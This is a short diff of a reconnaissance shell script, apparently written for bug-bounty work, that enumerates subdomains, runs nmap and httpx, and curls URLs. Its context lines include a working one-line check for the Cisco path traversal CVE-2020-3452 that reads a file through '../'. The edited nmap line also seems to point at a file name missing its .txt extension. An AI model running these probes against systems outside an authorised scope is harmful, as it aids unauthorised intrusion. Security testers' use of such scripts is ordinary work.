@@ -1,6 +1,5 @@
-#!/usr/bin/zsh
-#
-# Make sure to ....           chmod +x <this-file.sh>
+#!/usr/bin/bash
+
 # Go get sub-domains!
 # TODO LATER ask user "Would you like to Brute-Force sub-domains as well? Y/N? <wordlist>" 
 # like: Y "/home/user/wordlists/subdomain-top-1-mil.txt"
@@ -30,7 +29,7 @@ then
 	sort "$FILE" | uniq -u > ips4nmap.txt;
 fi
 
-nmap -A -p- -iL ips4nmap.txt -oS "nmap-A-p-iL-result"
+nmap -A -p 1-1000 --max-retries 1 -iL ips4nmap -o "nmap-A-p-iL-result"
 
 cat sorted-sub-domains.txt | httpx > urls.txt
 sleep 10
@@ -70,4 +69,3 @@ cat urls/urls.txt | while read h do; do curl -sk "$h/module/?module=admin%2Fmodu
 
 # CVE-2020-3452
 while read LINE; do curl -s -k "https://$LINE/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua&default-language&lang=../" | head | grep -q "Cisco" && echo -e "[${GREEN}VULNERABLE${NC}] $LINE" || echo -e "[${RED}NOT VULNERABLE${NC}] $LINE"; done < in-scope.txt > vuln-2-CVE-2020-3452
-
